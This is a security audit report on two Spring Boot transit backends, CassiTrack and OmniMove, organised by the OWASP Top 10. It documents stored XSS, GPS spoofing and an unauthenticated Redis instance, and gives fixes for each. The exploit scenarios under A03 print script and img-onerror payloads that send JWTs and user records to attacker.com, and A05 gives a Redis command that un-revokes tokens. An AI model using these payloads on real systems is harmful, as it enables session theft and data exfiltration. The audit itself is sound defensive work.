# OWASP Top 10 Security Audit — CassiTrack + OmniMove

> Audit date: 2026-06-24  
> Scope: cassitrack-backend + omnimove-backend (Spring Boot 3.x)  
> Method: Static code analysis of controllers, configs, frontends, pom.xml, docker-compose

---

## Executive Summary

Both backends are mature in their Spring Security configuration: JWT is stateless, BCrypt is used for passwords, actuator endpoints are restricted, role-based access control is consistently applied via `@PreAuthorize`, and parameterised JPA queries prevent SQL injection. The OWASP Dependency-Check plugin is wired into both Maven builds with `failBuildOnCVSS=7`.

However, **four confirmed vulnerabilities** of medium-to-high severity remain. The two most critical are **stored XSS** flaws in both admin dashboards — any user who registers with a crafted name or email can execute JavaScript in an administrator's browser, stealing their JWT and gaining full admin control. The other confirmed findings are an **unimplemented driver-to-vehicle assignment check** (any driver can spoof GPS data for any bus) and a **missing Redis password in OmniMove** (allowing an attacker with network access to un-revoke blacklisted tokens).

---

## A01 — Broken Access Control

**Status: PARTIALLY PROTECTED**

Spring Security's filter chain and `@PreAuthorize` annotations correctly enforce role separation across all API controllers. The BOLA fix in `UserService.updateUser()` correctly prevents an ADMIN from updating another ADMIN.

### Finding A01-1 — IDOR: Any authenticated DRIVER can spoof GPS positions for any vehicle

| Field | Detail |
|---|---|
| **File** | `cassitrack-backend/src/main/java/it/unicas/cassitrack/controller/DriverController.java`, lines 42–45 |
| **Severity** | High |

**Description:** `DriverController.publishLocation()` extracts `vehicle_id` from the JSON request body without verifying that the authenticated driver is actually assigned to that vehicle. Line 44 contains an explicit `// TODO: Query your database here to verify...` comment acknowledging this check was never implemented. No downstream service performs this validation either. The `User` entity has no `vehicle_id` or `assigned_vehicle` field.

**Exploit Scenario:** A driver authenticated as `driver@company.com` (assigned to MAGNI-001) calls `POST /api/v1/driver/location` with body `{"vehicle_id":"MAGNI-002","lat":41.5,"lon":13.85,...}`. The server publishes this to the MQTT topic `cassitrack/MAGNI-002/position`, causing MAGNI-002 to appear at a false GPS location in the live fleet dashboard, corrupting ETA calculations and analytics for that bus.

**Fix:** Before publishing, query the database to confirm the principal's email matches the driver assigned to the requested `vehicle_id`. Add a `vehicle_id` field to the `User` entity (or a dedicated assignment table) and reject requests where the mismatch is detected.

---

## A02 — Cryptographic Failures

**Status: PROTECTED**

- Both backends use **BCrypt** for password hashing.
- JWT secrets are loaded from environment variables with **no insecure default fallback** — both `application.yml` files use `${JWT_SECRET}` with no colon-default.
- JWT is signed with **HS256** via `io.jsonwebtoken` 0.11.5; `Keys.hmacShaKeyFor()` throws a `WeakKeyException` if the key is under 256 bits.
- Email transmission uses STARTTLS (`starttls.required: true`, OmniMove `application.yml:53–54`).
- No custom cryptographic implementations were found.

**No issues found.**

---

## A03 — Injection

**Status: VULNERABLE**

### Finding A03-1 — Stored XSS in CassiTrack admin user table

| Field | Detail |
|---|---|
| **File** | `cassitrack-backend/src/main/resources/static/cassitrack-admin.html`, lines 946–958 |
| **Severity** | High |

**Description:** The admin user management table renders `user.name`, `user.surname`, `user.email`, and other fields directly via `row.innerHTML = \`...\`` template literals. No `escHtml()` function exists anywhere in this file — the helper that exists in `cassitrack-fleetmanager.html` (line 1116) was never ported to the admin page. `RegisterRequest.java` (CassiTrack) has no `@Pattern` restriction on `name` or `surname` to block HTML characters.

**Exploit Scenario:** An admin creates a user with name `<script>fetch('https://attacker.com/?t='+localStorage.getItem('cassitrack_token'))</script>`. When any admin loads the user list page, the script executes and exfiltrates their JWT.

**Fix:** Copy the existing `escHtml()` function from `cassitrack-fleetmanager.html:1116` into `cassitrack-admin.html` and wrap every `${user.*}` expression in the table template with it.

---

### Finding A03-2 — Stored XSS in OmniMove admin user table

| Field | Detail |
|---|---|
| **File** | `omnimove-backend/src/main/resources/static/omnimove-admin.html`, lines 905–919 |
| **Severity** | High |

**Description:** `renderTable()` builds the user table via `tb.innerHTML = data.map(u => \`...\`)`. The `u.name` and `u.email` fields are interpolated without escaping. No `escHtml()` equivalent exists in `omnimove-admin.html`. OmniMove's `RegisterRequest.java` is a plain `@Data` class with **no validation constraints at all** — and `POST /api/v1/auth/register` is `permitAll()`, meaning any anonymous user can register with a crafted name.

**Exploit Scenario:** An attacker registers via the public endpoint with `name: "<img src=x onerror=fetch('/api/v1/admin/users').then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.com',JSON.stringify(d)))>"`. When the OmniMove admin views the user list, this payload executes, exfiltrating all registered user records.

**Fix:** (1) Add input validation to OmniMove's `RegisterRequest.java` — at minimum `@NotBlank @Size(max=100) @Pattern(regexp="[^<>\"']*")` on `name`, and `@Email` on `email`. (2) Apply HTML escaping in `omnimove-admin.html`'s `renderTable()`.

---

### Finding A03-3 — Stored XSS via MQTT vehicle_id in analytics page

| Field | Detail |
|---|---|
| **Sink** | `cassitrack-backend/src/main/resources/static/cassitrack-analytics.html`, line 279 |
| **Source** | `cassitrack-backend/src/main/java/it/unicas/cassitrack/mqtt/MqttMessageHandler.java`, lines 89–97 |
| **Severity** | High |

**Description:** The analytics dashboard renders `v.vehicle_id` directly via `${v.vehicle_id}` inside a `tbody.innerHTML` assignment. `MqttMessageHandler.isValid()` checks only for null/blank, coordinate range, timestamp presence, and message freshness — it applies **no character whitelist or format restriction on `vehicle_id`**. A vehicle ID containing HTML passes all validation checks, gets stored in InfluxDB and Redis, is returned verbatim from the analytics API, and is rendered without escaping.

**Exploit Scenario:** A rogue GPS device (or the compromised `DriverController` endpoint from A01-1) publishes an MQTT message with `"vehicle_id": "<script>fetch('https://attacker.com/?jwt='+localStorage.getItem('cassitrack_token'))</script>"`. When a FLEET_MANAGER loads the analytics page, the script executes and exfiltrates their JWT.

**Fix:** In `MqttMessageHandler.isValid()`, add: `if (!pos.getVehicleId().matches("[A-Za-z0-9_\\-]{1,50}")) return false;`. Also apply `escHtml(v.vehicle_id)` in `cassitrack-analytics.html` line 279 as defence-in-depth.

---

### Injection categories confirmed clean

- **SQL Injection:** All queries use Spring Data JPA with Hibernate parameterised queries. No string-concatenated native SQL found.
- **InfluxDB/Flux Injection:** `AnalyticsController` enforces strict `ISO_INSTANT` and `SAFE_ID` patterns on all user-supplied parameters before they reach query builders.
- **XXE (NeTEx/XML):** `NetexImportService.java` correctly disables external entities (`IS_SUPPORTING_EXTERNAL_ENTITIES=false`) and DTD processing (`SUPPORT_DTD=false`).

---

## A04 — Insecure Design

**Status: PARTIALLY PROTECTED**

### Finding A04-1 — `MOCK_TOKEN_UNTIL_LOGIN` literal in registration response

| Field | Detail |
|---|---|
| **File** | `cassitrack-backend/src/main/java/it/unicas/cassitrack/controller/AuthController.java`, line 61 |
| **Severity** | Low |

**Description:** After successful registration, the response includes `"token": "MOCK_TOKEN_UNTIL_LOGIN"`. This is not a valid JWT and is correctly rejected by the filter chain. However, it is a misleading API contract — any client assuming this represents an active session and using it in an `Authorization` header would silently fail in unexpected ways rather than receiving a clear 401.

**Fix:** Return `null` or omit the `token` field from the registration response entirely.

---

## A05 — Security Misconfiguration

**Status: PARTIALLY PROTECTED**

### Finding A05-1 — OmniMove Redis instance has no password configured

| Field | Detail |
|---|---|
| **File** | `omnimove-backend/src/main/resources/application.yml`, lines 30–33 |
| **Severity** | High |

**Description:** OmniMove's Redis configuration specifies only `host: localhost` and `port: 6380` — there is no `password` field. CassiTrack's equivalent correctly requires `password: ${SPRING_REDIS_PASSWORD}`. OmniMove uses Redis for the **JWT token blacklist** (logout revocation) and brute-force rate limiting. If the Redis instance at port 6380 is accessible without authentication, an attacker with network access can flush the blacklist and re-enable previously invalidated JWTs.

**Exploit Scenario:** An attacker obtains a valid JWT, the legitimate user logs out (token added to Redis blacklist), the attacker connects to the unauthenticated Redis at port 6380 and runs `DEL jwt_blacklist:<token_value>`. The token is removed and becomes valid again, granting continued access.

**Fix:** Add `password: ${SPRING_REDIS_PASSWORD}` to OmniMove's Redis stanza in `application.yml` and configure `requirepass` on the Redis server on port 6380.

---

### Other configuration reviewed and confirmed clean

- H2 console disabled in both backends.
- `show-sql: false` in both backends.
- `health.show-details: never` on actuator in both backends.
- CORS restricted to configurable origin lists in both backends.

---

## A06 — Vulnerable Components

**Status: PROTECTED**

Both `pom.xml` files configure the **OWASP Dependency-Check Maven plugin** (version 10.0.4) with `failBuildOnCVSS=7`, meaning the build fails if any dependency has a known CVE with CVSS ≥ 7.

| Component | Version |
|---|---|
| Spring Boot | 3.2.5 |
| jjwt (io.jsonwebtoken) | 0.11.5 |
| influxdb-client-java | 7.1.0 |
| springdoc-openapi | 2.5.0 |
| Java | 17 |

**No issues found.**

---

## A07 — Identification and Authentication Failures

**Status: PROTECTED**

- JWT tokens expire in **1 hour** in both backends.
- CassiTrack: Redis-backed brute-force rate limiting on login.
- OmniMove: DB-tracked `failedLoginAttempts`, account locked after 5 failures.
- Email verification enforced before login in OmniMove.
- Password complexity enforced in both backends (uppercase, lowercase, digit, special character).
- Logout invalidates JWTs via Redis token blacklist in OmniMove.
- Password reset tokens are UUID-based, expire in 1 hour, delivered via email URL fragment (not logged, not in query parameters).

**No issues found.**

---

## A08 — Software and Data Integrity Failures

**Status: PROTECTED**

- No Java `ObjectInputStream` deserialisation of untrusted data found. All JSON parsing uses Jackson DTO mapping.
- NeTEx XML import uses `XmlMapper` with external entities and DTD disabled.
- Redis stores only string values (JWT tokens, counters) — not serialised Java objects.
- No `@JsonTypeInfo` polymorphic deserialisation with `As.CLASS` found.

**No issues found.**

---

## A09 — Security Logging and Monitoring Failures

**Status: PROTECTED**

Both backends implement a dedicated `SecurityAuditService` with a `SECURITY_AUDIT` logger at `INFO` level. Logged events include: registration, login success/failure, email verification, weak password rejection, and token operations.

- Passwords are never logged.
- JWT tokens are not logged.
- PII fields (`taxId`, `telephone`) are masked in API responses via `UserDTO`.
- Password reset tokens are no longer logged (fixed in this security review cycle).

**No issues found.**

---

## A10 — Server-Side Request Forgery

**Status: PROTECTED**

All server-initiated outbound HTTP calls use operator-configured or hardcoded base URLs:

| Call | URL Source |
|---|---|
| OmniMove → CassiTrack | `${CASSITRACK_URL}` env var — not user input |
| OmniMove → Anthropic API | Hardcoded to `https://api.anthropic.com/v1/messages` |
| OmniMove → OpenWeatherMap | Hardcoded city and URL |
| OmniMove → Google Maps | Hardcoded base URL; coordinate values sanitised by Google |
| OmniMove NeTEx import | `${CASSITRACK_NETEX_URL}` env var — not user input |

**No user-controlled SSRF paths found.**

---

## Summary Table

| # | Category | Status | Key Findings |
|---|---|---|---|
| A01 | Broken Access Control | ⚠️ PARTIALLY PROTECTED | Driver can spoof GPS for any vehicle (unimplemented TODO check) |
| A02 | Cryptographic Failures | ✅ PROTECTED | BCrypt, HS256, no insecure JWT defaults, STARTTLS enforced |
| A03 | Injection | ❌ VULNERABLE | Stored XSS in CassiTrack admin table; Stored XSS in OmniMove admin table; MQTT vehicle_id XSS in analytics page |
| A04 | Insecure Design | ⚠️ PARTIALLY PROTECTED | `MOCK_TOKEN_UNTIL_LOGIN` in registration response (low risk) |
| A05 | Security Misconfiguration | ⚠️ PARTIALLY PROTECTED | OmniMove Redis has no password — JWT blacklist bypassable |
| A06 | Vulnerable Components | ✅ PROTECTED | OWASP Dependency-Check plugin in both Maven builds (failBuildOnCVSS=7) |
| A07 | Authentication Failures | ✅ PROTECTED | 1h JWT expiry, brute-force lockout, email verification, password complexity |
| A08 | Data Integrity Failures | ✅ PROTECTED | No unsafe deserialisation; Jackson + DTD/XXE disabled |
| A09 | Logging & Monitoring | ✅ PROTECTED | SecurityAuditService in both backends; no sensitive data in logs |
| A10 | SSRF | ✅ PROTECTED | No user-controlled outbound URL host or protocol |

---

## Prioritised Remediation

### Priority 1 — High (fix before any public exposure)

1. **A03 / `omnimove-admin.html:905`** — Add `escHtml()` and apply to all user fields in `renderTable()`. Add `@NotBlank @Size(max=100) @Pattern(regexp="[^<>\"']*")` to `omnimove/dto/RegisterRequest.java`.
2. **A03 / `cassitrack-admin.html:946`** — Copy `escHtml()` from `cassitrack-fleetmanager.html:1116` and apply to every `${user.*}` expression in the user table template.
3. **A03 / `cassitrack-analytics.html:279`** — Apply `escHtml(v.vehicle_id)` and add `vehicle_id.matches("[A-Za-z0-9_\\-]{1,50}")` to `MqttMessageHandler.isValid()`.
4. **A05 / `omnimove application.yml:30`** — Add `password: ${SPRING_REDIS_PASSWORD}` and configure the Redis server on port 6380 to require authentication.

### Priority 2 — Medium (fix in next sprint)

5. **A01 / `DriverController.java:44`** — Implement the vehicle assignment check. Add a `vehicle_id` field to the `User` entity (or an assignment table) and reject requests where the driver's assigned vehicle does not match the requested `vehicle_id`.

### Priority 3 — Low (polish item)

6. **A04 / `cassitrack AuthController.java:61`** — Replace `"MOCK_TOKEN_UNTIL_LOGIN"` with `null` or omit the `token` field from the registration response.
